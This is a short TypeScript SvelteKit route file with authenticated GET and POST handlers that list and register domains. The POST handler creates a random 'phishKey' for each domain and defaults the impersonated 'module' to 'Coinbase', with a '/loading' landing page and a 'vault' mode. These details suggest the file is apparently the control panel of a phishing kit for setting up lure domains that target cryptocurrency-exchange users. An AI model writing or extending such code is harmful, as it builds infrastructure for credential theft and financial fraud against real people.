import type { RequestHandler } from './$types';
import { json, error } from '@sveltejs/kit';
import { dbGetDomains, dbInsertDomain } from '$lib/server/database.js';
import { serverState } from '$lib/server/state.js';

export const GET: RequestHandler = async ({ locals }) => {
	if (!locals.user) throw error(401, 'Unauthorized');
	return json({ domains: dbGetDomains() });
};

export const POST: RequestHandler = async ({ locals, request }) => {
	if (!locals.user) throw error(401, 'Unauthorized');
	const body = (await request.json()) as {
		domain?: string;
		module?: string;
		landingPage?: string;
		kind?: 'regular' | 'vault';
		idMode?: 'case_input' | 'url_param';
		caseId?: string;
	};
	const domain = (body.domain || '').trim();
	if (!domain) throw error(400, 'Domain is required');

	const phishKey = Math.random().toString(36).substring(2, 14);
	dbInsertDomain(domain, phishKey, {
		module: body.module || 'Coinbase',
		landingPage: body.landingPage || '/loading',
		kind: body.kind || 'regular',
		idMode: body.idMode || 'case_input',
		caseId: body.caseId || ''
	});

	serverState.domains = dbGetDomains();
	return json({ ok: true });
};
